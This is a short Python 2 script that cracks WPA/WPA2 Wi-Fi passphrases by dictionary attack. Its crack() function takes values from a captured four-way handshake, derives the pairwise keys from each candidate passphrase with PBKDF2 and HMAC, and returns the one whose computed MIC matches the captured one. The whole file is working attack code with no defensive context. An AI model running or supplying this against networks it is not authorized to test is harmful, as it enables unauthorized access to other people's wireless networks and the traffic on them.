import hmac,hashlib,binascii
from hashlib import sha1
from binascii import a2b_hex, b2a_hex, unhexlify
from pbkdf2_ctypes import pbkdf2_bin


def hmac4times(ptk, pke):
    tempPke = pke
    r = ''
    for i in range(4):
        r += hmac.new(ptk, pke + chr(i), sha1).digest()
    return r        

def crack(ssid, clientMac, APMac, Anonce, Snonce, mic, data, passPhrases):
    pke = "Pairwise key expansion" + '\x00' + min(APMac,clientMac)+max(APMac,clientMac)+min(Anonce,Snonce)+max(Anonce,Snonce)
    for passPhrase in passPhrases:
        pmk = pbkdf2_bin(passPhrase, ssid, 4096, 32)
        ptk = hmac4times(pmk,pke)
        if ord(data[6]) & 0b00000010 == 2:
            calculatedMic = hmac.new(ptk[0:16],data,sha1).digest()[0:16]
        else:
            calculatedMic = hmac.new(ptk[0:16],data).digest()
        if mic == calculatedMic:
            return passPhrase
    return False

